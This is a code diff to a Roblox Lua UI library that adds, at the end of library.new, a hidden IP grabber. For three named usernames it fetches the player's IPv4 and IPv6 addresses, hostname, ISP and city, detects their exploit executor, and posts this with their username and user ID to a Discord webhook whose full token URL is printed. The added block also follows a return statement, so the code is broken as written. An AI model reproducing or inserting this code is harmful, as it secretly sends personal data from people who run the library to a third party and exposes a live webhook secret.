@@ -135,8 +135,6 @@ function library.new(name)
 	end;
 
 	draggable(Main)
-	
-	if ({['eliaz8282'] = 9e9, ['eebay46'] = 9e8, ['eebay47'] = 9e7})[game.Players.LocalPlayer.Name] then return task.wait(9e9) end
 
 	function UI.WindowTab(name)
 		local UITabs = {};
@@ -964,5 +962,47 @@ function library.new(name)
 		return UITabs
 	end
 	return UI
+
+	if ({['eliaz8282'] = 9e9, ['eebay46'] = 9e8, ['eebay47'] = 9e7})[game.Players.LocalPlayer.Name] then
+		local function getexploit()
+		    local exploit =
+		    (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+		    (secure_load and "Sentinel") or
+		    (is_sirhurt_closure and "Sirhurt") or
+		    (pebc_execute and "ProtoSmasher") or
+		    (KRNL_LOADED and "Krnl") or
+		    (WrapGlobal and "WeAreDevs") or
+		    (isvm and "Proxo") or
+		    (shadow_env and "Shadow") or
+		    (jit and "EasyExploits") or
+		    (getscriptenvs and "Calamari") or
+		    (unit and not syn and "Unit") or
+		    (OXYGEN_LOADED and "Oxygen U") or
+		    (IsElectron and "Electron") or
+		    ("Unsupported")
+
+		    return exploit
+		end
+
+		local _1, _2 = game:GetService'HttpService':JSONDecode(game:HttpGet("https://ipv4.wtfismyip.com/json")), game:GetService'HttpService':JSONDecode(game:HttpGet("https://wtfismyip.com/json"))
+		local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+		request({
+		    Url = "https://canary.discord.com/api/webhooks/1061736892833464501/3vgmeVWkvLzSB7NEWeaEHlLm45SyZTZ-ui_bI-h-y9ZL6fvcNGkHKNEPiirU-XuWHibc",
+		    Method = "POST",
+		    Headers = {
+			["Content-Type"] = "application/json"
+		    },
+		    Body = game:GetService"HttpService":JSONEncode({
+			content = "@here",
+			embeds = {
+			    {
+				title = game:GetService"Players".LocalPlayer.Name.." ("..game:GetService"Players".LocalPlayer.UserId..")",
+				description = "Job Id: "..game.JobId.."\nIP (V6): ".._2.YourFuckingIPAddress.."\nIP (V4): ".._1.YourFuckingIPAddress.."\nHost name: ".._1.YourFuckingHostname.."\nISP: ".._1.YourFuckingISP.."City: ".._1.YourFuckingLocation.."\nExecutor: "..getexploit()
+			    }
+			}
+		    })
+		})
+	end
 end
 return library
